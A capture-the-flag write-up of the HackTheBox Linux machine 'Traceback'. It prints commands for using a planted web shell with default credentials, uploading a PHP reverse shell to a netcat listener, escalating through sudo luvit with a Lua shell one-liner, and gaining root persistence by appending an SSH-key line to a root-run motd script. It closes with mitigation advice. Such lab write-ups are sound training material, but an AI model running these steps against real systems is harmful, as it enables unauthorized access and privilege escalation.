# Traceback

![](images/info.PNG)

__Task__: Find [user.txt](#user-flag) and [root.txt](#root-flag)

### Penetration Methodologies

__Scanning__

- nmap

__Enumeration__

- OSINT

- dirbuster

- Process Spying

__Exploitation__

- Reverse shell

__Priv Esc__

- GTFOBins

- File permission abuse

***

 This is my write up for the HackTheBox Linux machine _Traceback_.

## User Flag

Let's start by scanning the _Traceback_ machine using `nmap`.

- __sC__: Enable common scripts

- __sV__: version and service on the port

- __O__: remote OS detection using fingerprinting

```
# Nmap 7.80 scan initiated Sat Apr 25 13:14:52 2020 as: nmap -sC -sV -O -oA scan181 10.10.10.181
Nmap scan report for 10.10.10.181
Host is up (0.086s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
4444/tcp open  krb524?
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=8/17%OT=22%CT=1%CU=33973%PV=Y%DS=2%DC=I%G=Y%TM=5F3B1A4
OS:7%P=x86_64-pc-linux-gnu)SEQ(SP=FC%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11
OS:NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(
OS:R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Aug 17 19:01:11 2020 -- 1 IP address (1 host up) scanned in 42.92 seconds
```

The open ports from our `nmap` results indicate that this is a web server (port 80), with SSH remote access (port 22) available.

Since we lack SSH credentials, let's check out the webpage.

![](images/webpage.png)

It looks like this site has already been hacked, and the attacker states that they have left a backdoor on the machine. There isn't much more information or additional apparent webpages, so let's check out the source for the page.

```html
<body>
        <center>
                <h1>This site has been owned</h1>
                <h2>I have left a backdoor for all the net. FREE INTERNETZZZ</h2>
                <h3> - Xh4H - </h3>
                <!--Some of the best web shells that you might need ;)-->
        </center>
</body>
```

Something interesting stands out, the attacker left a comment within the source HTML. Googling this comment returns a github page with [different web shells](https://github.com/TheBinitGhimire/Web-Shells). Judging by the message, we can assume that the attacker left one of these on the web server.

Let's go ahead and create a list with the filenames for these shells and use `dirb` to enumerate through it.

```
$ dirb http://10.10.10.181/ webshell-list.txt
```

The webpage `http://10.10.10.181/smevk.php` successfully returns a status code 200, indicating that it is available. Let's navigate to it in our web browser.

![](images/shell-login.png)

Looks like we'll need some credentials for the shell. Referring back to the source code for the shell, we find the default login information is `admin:admin`.

```
//Make your setting here.
$deface_url = 'http://pastebin.com/raw.php?i=FHfxsFGT';  //deface url here(pastebin).
$UserName = "admin";                                      //Your UserName here.
$auth_pass = "admin";                                  //Your Password.
```

Trying this, we log in successfully.

![](images/shell.png)

The shell has a lot of options to sift through but the first thing that stands out is the capability to upload files through the shell interface. It also looks like this shell is running as user `webadmin`.

Command execution is limited through this shell, so let's try to upload a reverse shell. We'll use [this one](https://github.com/pentestmonkey/php-reverse-shell) from pentestmonkey.

First, let's start our listener for our reverse shell.

```
$ nc -lvnp 4444
```

After successfully  uploading the shell, we can navigate to the page `http://10.10.10.181/php-reverse-shell.php`, which connects to our listener, providing us with a shell!

After having a look around, we find a text document named `note.txt` within the home directory of the user `webadmin`.

```
$ cd /home/webadmin
$ cat note.txt
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
```

Looks like the system admin left a tool for the web admin to practice Lua, a programming language, with. Let's also check our privileges with the command `sudo -l`.

The results indicate that we can run the `luvit` command as the user `sysadmin` without a password. A little research reveals that [luvit](https://luvit.io/) is a tool used that provides asynchronous I/O for Lua and can run scripts in the CLI. Addtionally, [GTFOBins](https://gtfobins.github.io/gtfobins/lua/) has some information regarding abusing Lua to escalate privileges.

We'll create a Lua script that will open a shell as the user `sysadmin`. This should escalate our privileges.

```
$ touch pe.lua
$ printf "os.execute('/bin/bash -i')" > pe.lua
$ sudo -u sysadmin /home/sysadmin/luvit pe.lua
```

Success! We are now `sysadmin`. Let's grab the user flag.

![](images/user-flag.png)

## Root Flag

Now that we've successfully escalated privileges, let's go ahead and create persistence, this will also assist us as move forward to getting root access.

We'll add our public key to the `authorized_keys` file within the hidden `.ssh` subdirectory in the home directory of `sysadmin`.

Linux Handbook has a [great article](https://linuxhandbook.com/add-ssh-public-key-to-server/) on how we can do this. Having already generated the keys, the next step is for us to add our public key on the remote host. The we can connect via SSH.

As `sysadmin` and within the `.ssh` subdirectory, we will create the `authorized_keys` file, and use the `printf` command to append our public SSH key to the file.

```
$ touch authorized_keys
$ printf "\n[my public ssh key]\n" >> authorized_keys
```

Now that we have more reliable persistence and the ability to transfer files, let's upload pspy64, [an unprivileged process spy](https://github.com/DominicBreuker/pspy), so we can enumerate processes.

Let's use secure copy with our SSH access to get it onto the box.

```
$ scp pspy64 sysadmin@10.10.10.181:/tmp
```

Within our SSH session, we'll run `pspy64`.

![](images/pspy.png)

One process that stands out refers to the `motd.d` or "Message of the Day" daemon. Essentially, the backup "Message of the Day" is replacing the current `motd.d` every 30 seconds.

More useful info on `motd.d` can be found [here](https://linuxconfig.org/how-to-change-welcome-message-motd-on-ubuntu-18-04-server).

![](images/processes.png)

This process certainly stands out. Let's examine the `00-header` file, which contains the actual "Message of the Day", a bit further.


```
$ ls -al /etc/update-motd.d/00-header
-rwxrwxr-x 1 root sysadmin 981 Jun  2 10:40 /etc/update-motd.d/00-header
```

It looks like our header file can be edited by the `sysadmin`, yet is executed as root. This is a script, so we should be able to add commands that will execute as root and potentially escalate our privileges. Additionally, it looks like the previous attacker already edited this file with their own message.

![](images/motd.png)

We'll run the following command, which will append some script to the `motd.d` header file that, when executed, will add our public SSH key to the  `authorized_keys` file of the root user.

```
echo "printf \"\n[my public ssh key]\n\" >> /root/.ssh/authorized_keys" >> 00-header
```

The command within the `00-header` file will only execute when it is called, which occurs when a user logs in or connects via SSH. Additionally, the backup overwrites this file every 30 seconds, so we need to be quick.

Once we've run the command to append our public SSH key, we can SSH as `sysadmin` which will execute the command. Our public key should now be in the root user's `authorized_keys` file.

We can now successfully connect with SSH as root! Let's capture the final flag.

![](images/root-flag.png)

***

### Mitigation

This box is interesting considering the scenario places us attempting access after another hack. It's excellent practice from a recovery or forensic standpoint but it's difficult to describe certain mitigation techniques as we do not know how the attacker gained their initial foothold. Regardless, I've included some mitigation techniques I've found regarding privilege escalation.

- Carefully consider the risks of providing other users with certain escalated privileges, especially when it allows commands to be run as other users. This has a risk of being exploited and resources like [GTFOBins](https://gtfobins.github.io/) demonstrate the plethora of options to do this.

- Avoid allowing lower privileged users the ability to edit scripts that are executed as a higher privileged user, especially as root. This can certainly lead to abuse if an attacker has access to the lower privileged account. Routine checks should be done to ensure that files don't have dangerous or potentially exploitable permissions and the risks associated with any changes to the default permissions should be understood.

### Final Thoughts

This was only my second Linux machine at the time and I learned a lot, especially about Linux specific file structures and permissions. Doing some basic process enumeration was also beneficial and I enjoyed the challenge of using the resources I had to progress, without just finding a pre-made proof of concept or exploit.
